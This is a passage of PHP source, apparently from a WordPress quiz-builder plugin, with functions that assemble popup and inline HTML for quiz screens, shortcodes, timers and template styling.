			$output_data = '<div class="quiz_social_share_template_outer quiz_outer_fe hide_cls  " style="display:none"><div class="modal_pop_center"><div class="modal_pop_inn" >'.$image_background.$close_data.$cssfile.$output.'</div> </div> </div> ';
		}else if($quiz_display == "corner_popup"){
			$close_data = '<div class="close_Side_Popup"><i class="fa fa-times" aria-hidden="true"></i></div>';
			$output_data = '<div class="quiz_social_share_template_outer quiz_outer_fe corner_popup hide_cls  " style="display:none"><div class="modal_pop_corner '.$modal_pop_corner_position.'"><div class="modal_pop_inn" style="'.$default_image.'">'.$image_background.$close_data.$cssfile.$output.'</div> </div> </div> ';
		}else{
			$output_data = '<div class="quiz_social_share_template_outer quiz_outer_fe hide_cls '.$classforvh.'" style="'.$displaydata.$default_image.'">'.$image_background.$cssfile.$output.'</div> ';
		}

		if($template_num == "template6"){
			$output_data .= '<style>.quiz_social_share_template_outer {position: relative; z-index: 999; }</style>';
		}
	}
	return $output_data;
}


//getananlysing data
function sqbGetAnalyzeData($quiz_id, $result , $quiz_display, $modal_pop_corner_position){

	/*Template 6 */

	$sqbObj =  SQB_Quiz::loadById($quiz_id);
	if($sqbObj){

	$template =  $sqbObj->getTemplate();
                                
        $default_image = '';
        $image_background = '';
        $imgbg_postion ='center top';
        $classforvh = '';
        if($template == "template6"){

            if($sqbObj->getTransparentBackgroundSettings() != ''){

                $get_settings = $sqbObj->getTransparentBackgroundSettings();

                $get_details = explode("|",$get_settings);

                $width_sign = $get_details[0];
                $background_width = $get_details[1];
                $height_sign = $get_details[2];
                $background_height = $get_details[3];
                $settings_image = $get_details[4];
                $min_height = $get_details[5];
                $imgbg_postion = $get_details[8];
				$background_color = '';
				$height_main = '';
				$template6_background_padding = '';
				if(!empty($get_details[9])){
				$background_color = $get_details[9];
				}
				if(!empty($get_details[11])){
								$height_main = $get_details[11];
							}

				if(!empty($get_details[12])){
					$template6_background_padding = $get_details[12];
				}

				
                if($settings_image == '' || $settings_image == 'none' || $settings_image == 'undefined'){
					//$default_image .= 'background-image:url('.plugin_dir_url(__FILE__).'includes/images/template6.jpeg);';
					//$get_img_url = plugin_dir_url(__FILE__).'includes/images/template6.jpeg)';
					$get_img_url = '';
				}else{
					//$default_image .= 'background-image:url('.$settings_image.');';
					$get_img_url = $settings_image;
				}
				if($width_sign == 'px'){
					$default_image .= 'width:'.$background_width.'px;';
					$default_image .= 'background-repeat:no-repeat;';
					$default_image .= 'background-position:'.$imgbg_postion.';';
					$default_image .= 'background-size: cover;';
					$default_image .= 'max-width: 100%;';
					$default_image .= 'position:relative;';
					//$default_image .= 'min-height:'.$height_main.';';
				} else if($width_sign = '%'){
					$default_image .= 'width:'.$background_width.'%;';
					$default_image .= 'background-repeat:no-repeat;';
					$default_image .= 'background-position:'.$imgbg_postion.';';
					$default_image .= 'background-size: cover;';
					$default_image .= 'max-width: 100%;';
					$default_image .= 'position:relative;';
					//$default_image .= 'min-height:'.$height_main.';';
				}

				if($height_sign == 'px'){
					$default_image .= 'padding:'.$background_height.'px 0;';
				} else if($height_sign = 'vh'){
					$default_image .= 'min-height:'.$background_height.'vh;';
					//$default_image .= 'min-height:'.$min_height.';';
					$show_start_screen =  $sqbObj->getShowStartScreen();
					if(@$show_start_screen =="Y"){
					$default_image .= '';
					} else {
					$default_image .= 'display: none;';
					}
					
					$classforvh = "height-in-vh";
					$default_image .= 'justify-content: center;';
					$default_image .= 'align-items: center;';
					$default_image .= 'position:relative;';
					//$default_image .= 'min-height:'.$height_main.';';
				}
				$default_image .= 'background-color: '.$background_color.';';
				if(!empty($get_details[12])){
					$default_image .= 'padding-top: '.$template6_background_padding.'px;';
					$default_image .= 'padding-bottom: '.$template6_background_padding.'px;';
				}
			}else{
				//$default_image = 'background-image:url('.plugin_dir_url(__FILE__).'includes/images/template6.jpeg);';
				$get_img_url = plugin_dir_url(__FILE__).'includes/images/template6.jpeg';
				$default_image .= 'background-repeat:no-repeat;';
				$default_image .= 'background-position:'.$imgbg_postion.';';
				$default_image .= 'background-size: cover;';
				$default_image .= 'position:relative;';
				$default_image .= 'min-height:'.$height_main.';';
			} 
			if($get_img_url == ''){
			$image_background = '';
			} else {
			$image_background = '<div class="background-image-template6"><img src="'.$get_img_url.'"></div>';
			}
		}
    }

	/* End */

	 $output=''; 
	 $template_num = '';
	 $classforvh = '';
	if($result  == 'Y'){
		$sqbTempData =  SQB_QuizTemplate::loadByQuizId($quiz_id);
		$html = $sqbTempData->getAnalyzingResultTemp();
		if($html != ''){
			$output = stripslashes($html);
			$output = str_replace('contenteditable="true"','contenteditable="false"',$output);
		}else{
			$output = '<div class="analyzing_result_temp" style="text-align: center;"> <div class="analyzing_result_content"> <h3 class="analyzing_result_title sqb_tiny_mce_editor">Preparing Report...</h3> <p class="sqb_tiny_mce_editor">Please wait... we are calculating your results</p> </div> <div class="analyzing_result_progress"><div class="progress"> <div class="analyzing-progress-bar" role="progressbar" style="width: 100%;background-color:#007bff;" aria-valuenow="100" aria-valuemin="0" aria-valuemax="100"></div> </div> <p class="analyzing_result_note sqb_tiny_mce_editor">* Do not leave the page or reload the page *</p> </div> <input type="hidden" name="time-delay-hidden" class="time-delay-hidden" value="3"> </div>';
			$output = str_replace('contenteditable="true"','contenteditable="false"',$output);
		}
	}
	
	$displaydata= "display:none;";		
	if($template_num == 'template5'){
	$csspath =  plugin_dir_url(__FILE__)."includes/templates/result/template5/template5.css";
	} else {
	$csspath =  plugin_dir_url(__FILE__)."includes/templates/result/template2/template2.css";
	}
	
	$cssfile = '<link href="'.$csspath.'" rel="stylesheet">'; 

	if($quiz_display =="popup" || $quiz_display =="exit" || $quiz_display =="entry" || $quiz_display =="time_based" || $quiz_display =="percentage_based"){
		
		$close_data = '<div class="close_Side_Popup"><i class="fa fa-times" aria-hidden="true"></i></div>';
		$output_data = '<div class="quiz_analyzing_template_outer quiz_outer_fe hide_cls  " style="display:none"><div class="modal_pop_center"><div class="modal_pop_inn" >'.$image_background.$close_data.$cssfile.$output.'</div> </div> </div> ';
	}else if($quiz_display == "corner_popup"){
		$close_data = '<div class="close_Side_Popup"><i class="fa fa-times" aria-hidden="true"></i></div>';
		$output_data = '<div class="quiz_analyzing_template_outer quiz_outer_fe corner_popup hide_cls  " style="display:none"><div class="modal_pop_corner '.$modal_pop_corner_position.'"><div class="modal_pop_inn" style="'.$default_image.'">'.$image_background.$close_data.$cssfile.$output.'</div> </div> </div> ';
	}else{
		$output_data = '<div class="quiz_analyzing_template_outer quiz_outer_fe hide_cls '.$classforvh.'" style="'.$displaydata.$default_image.'">'.$image_background.$cssfile.$output.'</div> ';
	}

	if($template == "template6"){
		$output_data .= '<style>.quiz_analyzing_template_outer {position: relative; z-index: 999; }</style>';
	}
 
	return $output_data;
	 
}

function sqbShowTagsContent($atts, $content=null){

	$tagscontent = '';
	$content = do_shortcode($content);  
	extract(shortcode_atts(array( 
		'name'=>''
	), $atts));	
	if(isset($name) && $name !=""){	

		$tagscontent = getSQBTagsContent($name);
	}	
	return $tagscontent;
}

function ShowCategoryScoreContent($atts, $content=null){
	
	extract(shortcode_atts(array( 
		'id'=>'',
		'range'=>'',
		'name' => ''
	), $atts));	
	
	$html = '';
	if(isset($id) && $id !=""){
		$category = SQB_AdvancedCategoryRule::loadById($id);
		if(!empty($category)){
			$category_id = $category->getcategoryId();
			$html .= '<div class="ShowCategoryScoreContent" myid="'.$id.'" id="sss_'.$category_id.'" data-id="'.$category_id.'">';
			$html .= '[ShowCategoryScore id="'.$category_id.'" range="'.$range.'"]'.stripslashes($category->getCategoryDescription()).'[/ShowCategoryScore]';
			$html .= '</div>';

			$html .= '<div class="ShowCategoryScoreContentClone" style="display:none" id="sss_clone_'.$category_id.'" data-id="'.$category_id.'">';
			$html .= '[CloneShowCategoryScore id="'.$category_id.'" range="'.$range.'"]'.stripslashes($category->getCategoryDescription()).'[/CloneShowCategoryScore]';
			$html .= '</div>';	
		}else{
			$html = '';
		}
	}	
	return $html;
}

function ShowOutcomeDescContent($atts, $content=null){

	extract(shortcode_atts(array( 
		'id'=>'',
		'rank'=>'',
	), $atts));	
	
	$html = '';
	
	
	if(isset($rank) && $rank !=""){
		
		$outcome_description = '[ShowOutcomeDesc Rank="'.$rank.'"]';
		$html .= '<div class="outcome_data_description" data-rank="'.$rank.'">'.$outcome_description.'</div>';
		$outcome_description_clone = '[ShowOutcomeDescClone Rank="'.$rank.'"]';
		$html .= '<div class="outcome_data_description_clone" data-rank="'.$rank.'">'.$outcome_description_clone.'</div>';
		
	}	
	return $html;
}

function ShowOutcomeTitleContent($atts, $content=null){
	extract(shortcode_atts(array( 
		'id'=>'',
		'rank'=>'',
	), $atts));	
	
	$html = '';
	if(isset($rank) && $rank !=""){
		$outcome_title = '[ShowOutcomeTitle Rank="'.$rank.'"]';
		$html .= '<div class="outcome_data_title" data-rank="'.$rank.'">'.$outcome_title.'</div>';
		$outcome_title_clone = '[ShowOutcomeTitleClone Rank="'.$rank.'"]';
		$html .= '<div class="outcome_data_title_clone" data-rank="'.$rank.'">'.$outcome_title_clone.'</div>';
	}
	return $html;
}

function getSQBTagsContent($tagname){

	$tagscontents_html1 = '';
	$tagnamearr = explode(',',$tagname);
	$tagscontents_html = '<div class="sqb_tags_content_details">';
	$tagscontents_html .= '<div class="sqb_tags_content_inner">';
	
	foreach($tagnamearr as $tagname){
		$tag_content_object = SQB_Tags::loadTagContentWithTagNames($tagname);

		if(isset($tag_content_object) && !empty($tag_content_object)){
		$tagscontents_html .= '<div class="sqb_tags_content" id="tagcontent-'.$tag_content_object->getId().'" data-tag="'.$tag_content_object->getId().'">';	
		$tagscontents_html .= stripslashes($tag_content_object->getContent());
		$tagscontents_html .= '</div>';
		$tagscontents_html1 .= '<custom_tag>[showtaggcontent id="'.$tag_content_object->getId().'"]</custom_tag>';
		}
	}
	$tagscontents_html .= '</div>';
	$tagscontents_html .= '</div>';

	

	return $tagscontents_html1;
}

//for caluculator formula
function sqbCalculatorFormulaShortcode($atts, $content=null){
	$formula_data =''; 	
	$content = do_shortcode($content);  
	extract(shortcode_atts(array( 
		'id'=>''
	), $atts));		
	if(isset($id) && $id !=""){	
		$formula_data = getSQBFormulaData($id);
	}	 
	return $formula_data;
}

function getSQBFormulaData($id){
	$formula_data =''; 	
	if(isset($id) && $id !=""){	
		$sqbObj =  SQB_CalculatorFormula::loadById($id);
		$random_var = rand(10,100); 
		if(!empty($sqbObj)){		 		  
			$name = $sqbObj->getName(); 
			$html = $sqbObj->getHtml();
			$customizer_data = $sqbObj->getCustomzierData();
			$number_range = $sqbObj->getNumberRange();
			$formula_val = $sqbObj->getFormulaValues();
			$outcome_id = $sqbObj->getOutcomeId();
			$my_array_data = json_decode($customizer_data, TRUE);		 
			$prefix = $my_array_data['prefix'];  
			$sufix = $my_array_data['sufix'];  
			$html  = str_replace('contenteditable="true"','contenteditable="false"',$html); 
			$html  = str_replace('&&',' and ',$html); 
			$html  = str_replace('||',' or ',$html); 
			$html  = str_replace('Math.','',$html); 
			$html  = htmlspecialchars($html); 
			$formula_data .='<div class="sqb_formula_data" data-numtype="'.$number_range.'" data-range="'.$formula_val.'" data-outcome="'.$outcome_id.'" id="sqb_formula'.$id.'_'.$random_var.'" data-formula="'.$html.'"  data-prefix="'.$prefix.'" data-sufix="'.$sufix.'" data-name="'.$name.' '.$id.'" >'.$html.'</div>';			 
		}	 
	}	
	return $formula_data;
}


function SQBGetGlobalStyle($quiz_id){
	$style = '';
	$temp_global_theme_enable = 'N';
	$temp_global_theme_enable_class = ' ';
	$start_screen_global_style_dynamic = '';
	$question_screen_global_style_dynamic = '';
	$outcome_screen_global_style_dynamic = '';
	$opt_screen_global_style_dynamic = '';
	$temp_values_global_style_dynamic = '';
	$globalThemeDataHas = SQB_GlobalTheme::loadByQuizIdAndType($quiz_id,'global');
	if(isset($globalThemeDataHas) && is_array($globalThemeDataHas)){
		foreach($globalThemeDataHas as $globalThemeData){
			$global_screen_name = $globalThemeData->getName();
			if($globalThemeData->getStatus() == 'Y'){
				$temp_global_theme_enable = 'Y';
				$temp_global_theme_enable_class = ' sqb_global_theme_enable_each_template ';
			}
			
			if($globalThemeData->getOuterStyleStatus() == 'N'){
				$temp_global_theme_enable_class .= ' sqb_disable_background ';
			}
			
			if($temp_global_theme_enable == 'Y'){
				if($global_screen_name == 'start_screen'){
					$start_screen_global_style_dynamic = $globalThemeData->getValue();
					$style .= '<style>'.$start_screen_global_style_dynamic.'</style>';
				}else if($global_screen_name == 'question_screen'){
					$question_screen_global_style_dynamic = $globalThemeData->getValue();
					$style .= '<style>'.$question_screen_global_style_dynamic.'</style>';
				}else if($global_screen_name == 'outcome_screen'){
					$outcome_screen_global_style_dynamic = $globalThemeData->getValue();
					$style .= '<style>'.$outcome_screen_global_style_dynamic.'</style>';
				}else if($global_screen_name == 'opt_screen'){
					$opt_screen_global_style_dynamic = $globalThemeData->getValue();
					$style .= '<style>'.$opt_screen_global_style_dynamic.'</style>';
					
				}else if($global_screen_name == 'global_screen_values'){
					$temp_values_global_style_dynamic = $globalThemeData->getValue();
					
				}
			}
		}
	}
	$output = array('style'=>$style,'class'=>$temp_global_theme_enable_class);
	return $output;
}


function SQBAddMobileStyle($quiz_id){
	$mobilestyle='';
	$start_screen_theme_data_has = SQB_GlobalTheme::loadByQuizIdAndNameAndType($quiz_id,'start_screen','mobile');	 
	$quesm_screen_theme_data_has = SQB_GlobalTheme::loadByQuizIdAndNameAndType($quiz_id,'quesm_screen','mobile');	 
	$opt_screen_theme_data_has = SQB_GlobalTheme::loadByQuizIdAndNameAndType($quiz_id,'opt_screen','mobile');	 
	$outcome_screen_theme_data_has = SQB_GlobalTheme::loadByQuizIdAndNameAndType($quiz_id,'outcome_screen','mobile');	 
	if(isset($start_screen_theme_data_has)){
		$start_screen_mobile_css_style = $start_screen_theme_data_has->getValue();
		$start_screen_mobile_css_enable = $start_screen_theme_data_has->getStatus();
		if($start_screen_mobile_css_enable=="Y"){
			$mobilestyle .= '<style id="start_screen_style_dynamic"> @media (max-width: 767px) {'.$start_screen_mobile_css_style.'} </style>';
		}
	}
	if(isset($quesm_screen_theme_data_has)){
		$quesm_screen_mobile_css_style = $quesm_screen_theme_data_has->getValue();
		$quesm_screen_mobile_css_enable = $quesm_screen_theme_data_has->getStatus();
		if($quesm_screen_mobile_css_enable=="Y"){
			$mobilestyle .= '<style id="quesm_screen_style_dynamic"> @media (max-width: 767px) {'.$quesm_screen_mobile_css_style.'} </style>';
		}
	}
	if(isset($opt_screen_theme_data_has)){
		$opt_screen_mobile_css_style = $opt_screen_theme_data_has->getValue();
		$opt_screen_mobile_css_enable = $opt_screen_theme_data_has->getStatus();
		if($opt_screen_mobile_css_enable=="Y"){
			$mobilestyle .= '<style id="opt_screen_style_dynamic"> @media (max-width: 767px) {'.$opt_screen_mobile_css_style.'} </style>';
		}
	}
	if(isset($outcome_screen_theme_data_has)){
		$outcome_screen_mobile_css_style = $outcome_screen_theme_data_has->getValue();
		$outcome_screen_mobile_css_enable = $outcome_screen_theme_data_has->getStatus();
		if($outcome_screen_mobile_css_enable=="Y"){
			$mobilestyle .= '<style id="outcome_screen_style_dynamic"> @media (max-width: 767px) {'.$outcome_screen_mobile_css_style.'} </style>';
		}
	}
	return $mobilestyle; 	 
}

function getTimerData($timer_enable,$quiz_timer_hours,$quiz_timer_mint,$quiz_timer_sec,$quiz_timer_elapses_option,$quiz_timer_display_in_screen,$quiz_timer_html,$quiz_timer_expired_msg, $quiz_timer_spent_html,$timer_text_hour_html,	$timer_text_mint_html,$timer_text_sec_html){
	if($quiz_timer_hours ==""){
		$quiz_timer_hours =0;
	}
	if($quiz_timer_mint ==""){
		$quiz_timer_mint =0;
	}
	if($quiz_timer_sec ==""){
		$quiz_timer_sec =0;
	}
 
	$timer_data ='<div class="sqb_counter" style="display: inline-block;" >
		<div class="sqb_timer">	
		  <span class="sqb-hours">'.$quiz_timer_hours.'</span>  <div class="add_div">:</div>
		  <span class="sqb-minutes">'.$quiz_timer_mint.'</span>  <div class="add_div">:</div>
		  <span class="sqb-seconds">'.$quiz_timer_sec.'</span>  
		</div>
		  <div class="sqb_timer">
		    <span class="sqb-hours_text">'.$timer_text_hour_html.'</span> <div class="add_div">&nbsp;</div>
			<span class="sqb-minutes_text">'.$timer_text_mint_html.'</span> <div class="add_div">&nbsp;</div>
			<span class="sqb-seconds_text">'.$timer_text_sec_html.'</span>   
		  </div>
		</div>';  
	$quiz_timer_expired_msg =  str_replace('contenteditable="true"','',$quiz_timer_expired_msg);
	$quiz_timer_spent_msg =  str_replace('contenteditable="true"','',$quiz_timer_spent_html);
	  if($quiz_timer_expired_msg ==''){
		 $quiz_timer_expired_msg =' Time expired. Sorry, you will not be able to continue with this quiz. Please opt-in to see the result.';
	  }

	$quiz_timer_html =  str_replace('contenteditable="true"','',$quiz_timer_html);
	$quiz_timer_html =  str_replace('%%TIMELEFT%%',$timer_data,$quiz_timer_html);
	$quiz_timer_html_data =  '<div class="quiz_timer_html_data" >'.$quiz_timer_html.'</div>';
	  
	$timer_msg ='<div class="quiz_timer_spent_msg" style="display:none;">'.$quiz_timer_spent_msg.'</div><div class="sqb_counter_expired_msg" style="display:none;">'.$quiz_timer_expired_msg.'</div><input type="hidden" id="timer_enable" value="'.$timer_enable.'"><input type="hidden" id="wheretoshow" value="'.$quiz_timer_display_in_screen.'"><input type="hidden" id="send_to_screen" value="'.$quiz_timer_elapses_option.'">';

	return '<div class="sqb_counter_outer" style="display:none;" >'.$quiz_timer_html_data.$timer_msg.'</div><input type="hidden" id="timer_count" value="0"><input type="hidden" id="timer_spent" value="0"><input type="hidden" id="time_spent1" value="0"><input type="hidden" id="time_hour" value="'.$quiz_timer_hours.'"><input type="hidden" id="time_min" value="'.$quiz_timer_mint.'"><input type="hidden" id="time_sec" value="'.$quiz_timer_sec.'"><div  id="timer_text_sec_html" style="display:none">'.$timer_text_sec_html.'<input type="hidden" id="timer_stop" value="0"></div>'; 
}

function sqbGetTemplate6bgImageStyle($id,$template){
		$default_image = '';
		$image_background = '';
		$classforvh = '';
		$template6_style = array();
		if($template == "template6"){
			$set_default_var = true;
			$sqbObj =  SQB_Quiz::loadById($id); 
			if(isset($sqbObj) && !empty($sqbObj)){
				if($sqbObj->getTransparentBackgroundSettings() != ''){
					$set_default_var = false;
					$get_settings = $sqbObj->getTransparentBackgroundSettings();

					$get_details = explode("|",$get_settings);

					$width_sign = $get_details[0];
					$background_width = $get_details[1];
					$height_sign = $get_details[2];
					$background_height = $get_details[3];
					$settings_image = $get_details[4];
					$min_height = $get_details[5];
					$imgbg_postion = $get_details[8];
					$background_color = '';
					$height_main = '';
					$template6_background_padding = '';
					if(!empty($get_details[9])){
					$background_color = $get_details[9];
					}
					if(!empty($get_details[11])){
								$height_main = $get_details[11];
							}
					if(!empty($get_details[12])){
						$template6_background_padding = $get_details[12];
					}
					if($settings_image == '' || $settings_image == 'none' || $settings_image == 'undefined'){
						//$default_image .= 'background-image:url('.plugin_dir_url(__FILE__).'includes/images/template6.jpeg);';
						//$get_img_url = plugin_dir_url(__FILE__).'includes/images/template6.jpeg)';
						$get_img_url = '';
					}else{
						//$default_image .= 'background-image:url('.$settings_image.');';
						$get_img_url = $settings_image;
					}
					if($width_sign == 'px'){
						$default_image .= 'width:'.$background_width.'px;';
						$default_image .= 'background-repeat:no-repeat;';
						$default_image .= 'background-position:'.$imgbg_postion.';';
						$default_image .= 'background-size: cover;';
						$default_image .= 'max-width: 100%;';
						$default_image .= 'position:relative;';
						//$default_image .= 'min-height:'.$height_main.';';
					} else if($width_sign = '%'){
						$default_image .= 'width:'.$background_width.'%;';
						$default_image .= 'background-repeat:no-repeat;';
						$default_image .= 'background-position:'.$imgbg_postion.';';
						$default_image .= 'background-size: cover;';
						$default_image .= 'max-width: 100%;';
						$default_image .= 'position:relative;';
						//$default_image .= 'min-height:'.$height_main.';';
					}

					if($height_sign == 'px'){
						$default_image .= 'padding:'.$background_height.'px 0;';
					} else if($height_sign = 'vh'){
						$default_image .= 'min-height:'.$background_height.'vh;';
						//$default_image .= 'min-height:'.$min_height.';';
						$show_start_screen =  $sqbObj->getShowStartScreen();
						if(@$show_start_screen =="Y"){
						$default_image .= '';
						} else {
						$default_image .= 'display: none;';
						}
						
						$classforvh = "height-in-vh";
						$default_image .= 'justify-content: center;';
						$default_image .= 'align-items: center;';
						$default_image .= 'position:relative;';
						//$default_image .= 'min-height:'.$height_main.';';
					}
					$default_image .= 'background-color: '.$background_color.';';
					if(!empty($get_details[12])){
					$default_image .= 'padding-top: '.$template6_background_padding.'px;';
					$default_image .= 'padding-bottom: '.$template6_background_padding.'px;';
				}
				}
			}
			if($set_default_var){
				//$default_image = 'background-image:url('.plugin_dir_url(__FILE__).'includes/images/template6.jpeg);';
				$get_img_url = plugin_dir_url(__FILE__).'includes/images/template6.jpeg';
				$default_image .= 'background-repeat:no-repeat;';
				$default_image .= 'background-position:'.$imgbg_postion.';';
				$default_image .= 'background-size: cover;';
				$default_image .= 'position:relative;';
				$default_image .= 'min-height:'.$height_main.';';
			}
			if($get_img_url == ''){
			$image_background = '';
			} else {
			$image_background = '<div class="background-image-template6"><img src="'.$get_img_url.'"></div>';
			}
		}
		$template6_style[] = $default_image;
		$template6_style[] = $image_background;
		$template6_style[] = $classforvh;
		return $template6_style;
}
 
//get quiz data , start, optin, question , outcome
function getQuizData( $id, $quiz_type, $quiz_display, $quiz_pagination,$question_per_page, $passmark , $question_display, $number_of_question, $branching, $outcome_type, $display_nextbutton, $quiz_attempts_allowed, $total_attempts , $show_firstname_temp, $template_num , $questions_random , $question_bank_options, $answers_random, $show_start_screen , $allow_retake,$status,$quiz_popup_time_delay,$quiz_popup_frequency,$quiz_popup_position,$quiz_slider_animation,$questions_top_border_setting,$analy_result,$sqb_show_share_screen,$category_option,$getExitPopupValue,$showpdfbutton,$pdf_button_html,$game_animation,$game_animation_option,$display_backbutton){
	 
	$tempdata="";
	$starttempdata="";
	$optintempdata="";
	$quesanstempdata="";
	$resulttempdata=""; 	
	$first_name_tempdata=""; 	

	//check if user loggedin in wp , then do the calaulations for show the start screen or retake
	$retake_data = "";
	$retake_data_html = "";
	$show_retake ="N";
 	
 	//get the session varibales 	
 	$lesson_id =""; 	 	
 	$course_id =""; 	 	
 	$dap_id =""; 	 	
	$retakedata_fornon_lesson=""; 	
	$showhiide_ques = false;	
	if($status =="Y"){
		do_action( 'dap_sqb_session');
		if(isset($_SESSION['current_lesson_id'])){
			$lesson_id = $_SESSION['current_lesson_id'];
		}
		if(isset($_SESSION['course_id'])){
			$course_id = $_SESSION['course_id'];
		}		
		if(isset($_SESSION['dap_id'])){
			$dap_id = $_SESSION['dap_id'];
		}
	}
		
	$already_given_quiz_status =0;	
	$count_manage_lead_data =0;	
   
	if($dap_id !=""){		
		if($lesson_id !=''  && $course_id != '') {							
			$leadsObj = SQB_ManageLeads::loadByQuizIdAndUserIdAndCourseIdAndLessonId($id, $dap_id, $course_id, $lesson_id);	
			if (!empty($leadsObj) && is_countable($leadsObj)) {
				$count_manage_lead_data = count($leadsObj); 
			}
		}
		if($count_manage_lead_data >0){
			$already_given_quiz_status = 1; 
		}		
	}	
	//echo "count_manage_lead_data". $count_manage_lead_data;
	  
 	//check if lesson  thing or not
 	$retakedata = '';
 	if($lesson_id !=''){
		$retake_data = sqb_check_for_retake_data($id,$quiz_attempts_allowed, $total_attempts , $dap_id, $allow_retake, $count_manage_lead_data, $course_id, $lesson_id);
		$retakedata = sqb_check_for_retake_html($id, $quiz_attempts_allowed, $total_attempts, $dap_id, $allow_retake, $retake_data, $count_manage_lead_data, $course_id, $lesson_id, $show_start_screen, $quiz_display);
		$starttempdata = getStartTemplateData($id, $lesson_id, $show_start_screen, $dap_id, $course_id,$quiz_display);	
 
		$outcometoshow = sqb_user_outcome($id, $dap_id, $course_id, $lesson_id);		 
		if($outcometoshow !=""){
			$show_start_screen ="N";
		}
 		
		if($retake_data =="retake_data"	){			
			$showhiide_ques =true;
		}elseif($retake_data =="notallowed"	){
			$showhiide_ques =true;
		}elseif($retake_data =="cannottakequiz"	){
			$showhiide_ques =true;
		} else{			
			$showhiide_ques = false;
		}
		//set  the defaults
		$quiz_display ="inpage";
		$branching ="N";
		$quiz_slider_animation ="N"; 
	}else{

		$starttempdata = getStartTemplateData($id, $lesson_id, $show_start_screen, "", "", $quiz_display);
		$retakedata_fornon_lesson = '<div class="reake_data_outer retake_without_lesson_div showhide_retake"  style="display:none">'.sqb_get_retake_data().'</div>';	
		$leads_total_attempts = 0;
		if(isset($_COOKIE['SQBRetake_'.$id])) {
			$leads_total_attempts = (int)$_COOKIE['SQBRetake_'.$id];
		}
	$retakedata_fornon_lesson .= '<input type="hidden" id="leads_total_attempts" value="'.$leads_total_attempts.'"/><input type="hidden" id="quiz_attempts_allowed" value="'.$quiz_attempts_allowed.'"/><input type="hidden" id="total_attempts" value="'.$total_attempts.'"/><input type="hidden" id="allow_retake" value="'.$allow_retake.'"/><input type="hidden" id="count_manage_lead_data" value="'.$count_manage_lead_data.'"/> ';		
	}  //end of if lesson  thing or not
	
	$modal_pop_corner_position = '';
	if($quiz_popup_position == 'Left' && $quiz_display == 'corner_popup'){
	$modal_pop_corner_position = 'modal_pop_corner_left';
	}
	$quesanstempdata = getQuesAnsTemplateData($id, $quiz_type, $quiz_display, $quiz_pagination, $question_per_page, $passmark ,  $question_display, $number_of_question, $branching,$display_nextbutton  , $questions_random , $question_bank_options, $answers_random, $lesson_id , $show_start_screen,$showhiide_ques, $retakedata, $count_manage_lead_data, $course_id, $dap_id,$quiz_popup_position,$template_num,$questions_top_border_setting,$category_option, $display_backbutton);
	$optintempdata = getOptinTemplateData($id, $quiz_display, $lesson_id,$quiz_popup_position,$template_num);	
	$resulttempdata = getResultTemplateData($id, $quiz_type, $outcome_type, $quiz_display, $template_num,$dap_id, $course_id, $lesson_id,$quiz_popup_position,$showpdfbutton,$pdf_button_html);

	//$quiz_type = $quiz_obj->getQuizType();
	$sqb_start_screen_background_image = "";
	$sqbObj =  SQB_Quiz::loadById($id); 
	if(isset($sqbObj) && !empty($sqbObj)){
		if($template_num == 'template8'){
			if($sqbObj->getTransparentBackgroundSettings() != ''){
				$get_settings = $sqbObj->getTransparentBackgroundSettings();

				$customizer_style_settings = maybe_unserialize($sqbObj->getCustomizerStyleSetting());
				if(!empty($customizer_style_settings["template8_background_image"])){
					$sqb_start_screen_background_image = 'sqb_start_screen_background_image';
				}

			}
		}
	}

	

	$funanimationData = '';
	$outcome_message = 'N';
	$timer_ga = 5;
	$audio_option = 'N';
	$template_name = '';
	if($game_animation == 'Y'){
		$funanimationData = getAnimationTemplateData($id, $quiz_type, $outcome_type, $quiz_display, $template_num,$dap_id, $course_id, $lesson_id,$quiz_popup_position,$game_animation_option);
		$outcome_message = !empty($game_animation_option['outcome_message']) ? $game_animation_option['outcome_message'] : 'N';
		$timer_ga = !empty($game_animation_option['timer']) ? $game_animation_option['timer'] : '5';
		$template_name = !empty($game_animation_option['template']) ? $game_animation_option['template'] : 'template1';
		$audio_option = !empty($game_animation_option['audio_url']) ? 'Y' : 'N';
	}

	$analyresulttempdata = sqbGetAnalyzeData($id, $analy_result, $quiz_display,  $quiz_popup_position);
	$formquizdata = sqbGetFormQuizData($id);
	
	$socialsharetempdata = sqbGetsocialShareData($id, $sqb_show_share_screen, $quiz_display, $quiz_popup_position,$template_num);
	//$socialsharetempdata = '';
	
	if($show_firstname_temp == 'Y'){ /*for first name template*/
		$template6_image_and_style = sqbGetTemplate6bgImageStyle($id, $template_num);
		if($template_num == 'template6'){
			$firstname_outer_style=$template6_image_and_style[0]; 
		} else {
			$firstname_outer_style="display:none";
		}	
		
		$quiz_firstname_temp = getFirstnameTemplateData($id, $template_num);
		if($quiz_display =="popup" || $quiz_display =="exit" || $quiz_display =="entry" || $quiz_display =="time_based" || $quiz_display =="percentage_based"){
			$close_data = '<div class="close_Side_Popup"><i class="fa fa-times" aria-hidden="true"></i></div>';
			$first_name_tempdata = '<div class="quiz_firstname_template_outer quiz_outer_fe hide_cls '.$sqb_start_screen_background_image.'"  style="'.$firstname_outer_style.'" ><div class="modal_pop_center"><div class="modal_pop_inn">'.$close_data .$quiz_firstname_temp.'</div></div> </div>';	
		}else if($quiz_display =="corner_popup"){
			$close_data = '<div class="close_Side_Popup"><i class="fa fa-times" aria-hidden="true"></i></div>';
			$first_name_tempdata = '<div class="quiz_firstname_template_outer quiz_outer_fe corner_popup hide_cls '.$sqb_start_screen_background_image.'"  style="'.$firstname_outer_style.'" ><div class="modal_pop_corner"><div class="modal_pop_inn">'.$close_data .$quiz_firstname_temp.'</div></div> </div>';	
		}else{
			$first_name_tempdata = ' <div class="quiz_firstname_template_outer quiz_outer_fe hide_cls '.$sqb_start_screen_background_image.'" style="'.$firstname_outer_style.'" >'.$template6_image_and_style[1].$quiz_firstname_temp.'</div>';
		}	
	}
	
	$third_party_from_enabled = getOptinValue($id, 'third_party_from_enabled');	 
	
	$show_firstname_outcome = !empty($show_firstname_outcome) ? $show_firstname_outcome : '';
	$optin_name = getOptinValue($id, 'optin_name');			 		 
	$optin_email = getOptinValue($id, 'optin_email');	
	$get_page_id=get_the_ID();
 	$hiddendata = '<input type="hidden" id="sqb_passmark" value="'.$passmark.'"/>';
 	$hiddendata .= '<input type="hidden" id="sqb_correct_ans" value="0"/>';
 	$hiddendata .= '<input type="hidden" id="sqb_points_ans" autocomplete="off" value="0"/>';
 	$hiddendata .= '<input type="hidden" id="outcome_type" value="'.$outcome_type.'"/>'; 
 	$hiddendata .= '<input type="hidden" id="quiz_display" value="'.$quiz_display.'"/>';
